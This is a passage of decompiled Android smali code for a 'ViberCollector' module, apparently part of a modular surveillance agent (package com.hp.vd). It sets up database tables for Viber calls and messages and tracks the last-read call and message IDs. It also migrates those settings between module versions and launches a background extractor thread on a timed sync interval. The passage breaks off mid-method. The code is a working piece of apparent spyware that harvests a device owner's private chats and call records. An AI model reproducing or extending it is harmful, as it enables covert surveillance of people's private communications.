.class public Lcom/hp/vd/module/custom/ViberCollector;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "ViberCollector.java"


# static fields
.field public static final ATTRIBUTE_MAX_CALL_ID:Ljava/lang/String; = "viber_max_call_id"

.field public static final ATTRIBUTE_MAX_CALL_ID_V1:Ljava/lang/String; = "max_call_id"

.field public static final ATTRIBUTE_MAX_MESSAGE_ID:Ljava/lang/String; = "viber_max_message_id"

.field public static final ATTRIBUTE_MAX_MESSAGE_ID_V1:Ljava/lang/String; = "max_message_id"

.field public static final ATTRIBUTE_MAX_READ_CALL_PER_ITERATION:Ljava/lang/String; = "400"

.field public static final ATTRIBUTE_MAX_READ_MESSAGE_PER_ITERATION:Ljava/lang/String; = "200"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "viber_synchronization_interval"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL_V1:Ljava/lang/String; = "synchronization_interval"


# instance fields
.field protected extractorThread:Ljava/lang/Thread;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected viberCallDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ViberCallData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected viberMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ViberMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 31
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 44
    iput-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->viberMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 45
    iput-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->viberCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 47
    iput-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->extractorThread:Ljava/lang/Thread;

    .line 48
    iput-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 49
    iput-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 55
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "custom"

    .line 57
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 58
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 59
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 60
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x2

    .line 61
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v2.0"

    .line 62
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "viber_max_message_id=0;"

    .line 64
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 65
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "viber_max_call_id=0;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 66
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "viber_synchronization_interval=3500;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 68
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    const/16 v1, 0xf

    .line 70
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 71
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "ViberCollector"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 369
    iget-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->lastSynchronization:Ljava/lang/Long;

    .line 370
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 371
    iget-object v2, p0, Lcom/hp/vd/module/custom/ViberCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "viber_synchronization_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 373
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    return v0

    .line 377
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/custom/ViberCollector;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    return v0
.end method

.method public initialize()Z
    .locals 7

    .line 211
    iget-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 219
    :try_start_0
    iget-object v2, p0, Lcom/hp/vd/module/custom/ViberCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    const-class v3, Lcom/hp/vd/data/ViberCallData;

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/ViberCollector;->viberCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 220
    iget-object v2, p0, Lcom/hp/vd/module/custom/ViberCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    const-class v3, Lcom/hp/vd/data/ViberMessageData;

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/ViberCollector;->viberMessageDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1

    .line 229
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/custom/ViberCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 235
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "system"

    .line 237
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 235
    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    const-string v3, "viber_max_call_id"

    .line 240
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "viber_max_call_id"

    .line 241
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "viber_max_call_id"

    .line 242
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_8

    :cond_0
    const-string v3, "viber_max_call_id"

    .line 244
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    const-string v3, "viber_max_call_id"

    const-string v4, "0"

    .line 245
    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 246
    iget-object v4, p0, Lcom/hp/vd/module/custom/ViberCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "viber_max_call_id"

    invoke-virtual {v4, v5, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "ModuleAbstract"

    .line 248
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Loaded (after update) viber_max_call_id: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_1
    const-string v3, "viber_max_message_id"

    .line 251
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    const-string v3, "viber_max_message_id"

    const-string v4, "0"

    .line 252
    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 253
    iget-object v4, p0, Lcom/hp/vd/module/custom/ViberCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "viber_max_message_id"

    invoke-virtual {v4, v5, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "ModuleAbstract"

    .line 255
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Loaded (after update) viber_max_message_id: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_2
    const-string v3, "viber_synchronization_interval"

    .line 258
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    const-string v3, "viber_synchronization_interval"

    const-string v4, "3501"

    .line 259
    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 260
    iget-object v4, p0, Lcom/hp/vd/module/custom/ViberCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "viber_synchronization_interval"

    invoke-virtual {v4, v5, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "ModuleAbstract"

    .line 262
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Loaded (after update) viber_synchronization_interval: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 265
    :cond_3
    iget-object v3, p0, Lcom/hp/vd/module/custom/ViberCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v3}, Lcom/hp/vd/module/custom/ViberCollector;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v3

    if-nez v3, :cond_4

    const-string v2, "ModuleAbstract"

    const-string v3, "Could not persist ATTRIBUTE_FIRST_RUN = FALSE."

    const/4 v4, 0x3

    .line 266
    invoke-interface {v0, v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 279
    :cond_4
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    const-string v4, "viber_max_call_id"

    .line 281
    invoke-interface {v2, v4}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_5

    const-string v4, "viber_max_call_id"

    .line 282
    invoke-interface {v3, v4}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    :cond_5
    const-string v4, "viber_max_message_id"

    .line 285
    invoke-interface {v2, v4}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_6

    const-string v4, "viber_max_message_id"

    .line 286
    invoke-interface {v3, v4}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    :cond_6
    const-string v4, "viber_synchronization_interval"

    .line 289
    invoke-interface {v2, v4}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_7

    const-string v2, "viber_synchronization_interval"

    .line 290
    invoke-interface {v3, v2}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 293
    :cond_7
    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    :cond_8
    :goto_0
    const/4 v0, 0x1

    return v0

    :catch_0
    move-exception v2

    const-string v3, "ModuleAbstract"

    const-string v4, "Exception caught while loading moduleData"

    .line 298
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_1
    move-exception v2

    const-string v3, "ModuleAbstract"

    const-string v4, "Exception caught while generating DAOs"

    .line 223
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 176
    iget-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 183
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v1

    .line 185
    const-class v2, Lcom/hp/vd/data/ViberCallData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I

    .line 190
    const-class v2, Lcom/hp/vd/data/ViberMessageData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 205
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1

    :catch_0
    move-exception p1

    const-string v1, "ModuleAbstract"

    const-string v2, "install(): exception caught during creating-second level tables"

    .line 196
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 p1, 0x0

    return p1
.end method

.method public isStarted()Z
    .locals 1

    const/4 v0, 0x0

    return v0
.end method

.method public start()Z
    .locals 8

    .line 315
    iget-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v6

    const-string v0, "ModuleAbstract"

    const-string v1, "start() called."

    .line 316
    invoke-interface {v6, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 318
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 326
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->hasUpdateIntervalExpired()Z

    move-result v0

    const/4 v7, 0x1

    if-ne v0, v7, :cond_1

    return v7

    .line 334
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-nez v0, :cond_3

    .line 336
    :cond_2
    new-instance v0, Lcom/hp/vd/module/custom/viber/ViberExtractor;

    .line 337
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/custom/ViberCollector;->viberCallDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v4, p0, Lcom/hp/vd/module/custom/ViberCollector;->viberMessageDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/custom/ViberCollector;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/custom/viber/ViberExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 344
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Viber-Extractor-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/custom/ViberCollector;->extractorThread:Ljava/lang/Thread;

    .line 345
    iget-object v0, p0, Lcom/hp/vd/module/custom/ViberCollector;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_3
    return v7
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 7

    .line 84
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "ModuleAbstract"

    const-string v2, "update() called on the new version. About to temporarily save important attributes."

    .line 85
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v1, 0x3

    const/4 v2, 0x0

    .line 90
    :try_start_0
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v3, :cond_0

    const-string p1, "ModuleAbstract"

    const-string v3, "The loaded persistedModuleData from the old module == NULL."

    .line 103
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    .line 112
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v4, "system"

    .line 114
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/ViberCollector;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v5

    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 112
    invoke-virtual {v1, v4, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 117
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 123
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iget-object v2, v2, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const/4 v4, 0x1

    const/4 v5, 0x0

    if-ne v2, v4, :cond_1

    const-string p1, "max_call_id"

    .line 124
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string p1, "max_message_id"

    .line 125
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v2, "synchronization_interval"

    .line 126
    invoke-virtual {v3, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    goto :goto_0

    .line 128
    :cond_1
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1

    iget-object p1, p1, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    const/4 v2, 0x2

    if-ne p1, v2, :cond_2

    const-string p1, "viber_max_call_id"

    .line 129
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string p1, "viber_max_message_id"

    .line 130
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v2, "viber_synchronization_interval"

    .line 131
    invoke-virtual {v3, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    goto :goto_0

    :cond_2
    move-object p1, v5

    move-object v2, p1

    :goto_0
    if-eqz v5, :cond_3

    const-string v3, "viber_max_call_id"

    .line 135
    invoke-interface {v1, v3, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v3, "ModuleAbstract"

    .line 140
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "update(): saving va from the previous module: viber_max_call_id="

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v0, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_3
    if-eqz p1, :cond_4

    const-string v3, "viber_max_message_id"

    .line 147
    invoke-interface {v1, v3, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v3, "ModuleAbstract"

    .line 152
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "update(): saving va from the previous module: viber_max_message_id="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_4
    if-eqz v2, :cond_5

    const-string p1, "viber_synchronization_interval"

    .line 159
    invoke-interface {v1, p1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string p1, "ModuleAbstract"

    .line 164
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "update(): saving va from the previous module: viber_synchronization_interval="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, p1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 170
    :cond_5
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1

    :catch_0
    const-string p1, "ModuleAbstract"

